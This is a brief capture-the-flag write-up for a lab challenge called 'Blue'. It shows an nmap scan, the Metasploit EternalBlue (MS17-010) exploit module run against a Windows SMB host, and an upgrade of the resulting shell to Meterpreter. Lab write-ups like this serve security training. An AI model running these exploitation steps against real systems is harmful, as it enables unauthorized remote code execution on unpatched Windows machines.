# Blue

This is the write-up for the challenge Blue.
It provides a server that has to be deployed and then the tasks can be done.

## Tasks

### Task 1 - Recon

As the name of the challenge suggests, we can assume that it is a Windows server that is vulnerable to **EternalBlue**.

The first thing to do is to scan the machine. The best method for this is using **Nmap** with some special parameters for more information:
```markdown
nmap -sC -sV -o nmap/blue.nmap [IP address]
```

### Task 2 - Gain Access

To exploit the **EternalBlue** vulnerability, we can use **Metasploit**:
```markdown
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS [IP address]

exploit
```

After running this exploit, it will spawn a command shell on the server.

### Task 3 - Escalate

To escalate this command shell to a **Meterpreter shell** we can background the session and use another module:
```markdown
use post/multi/manage/shell_to_meterpreter

set session [Session ID]

exploit
```
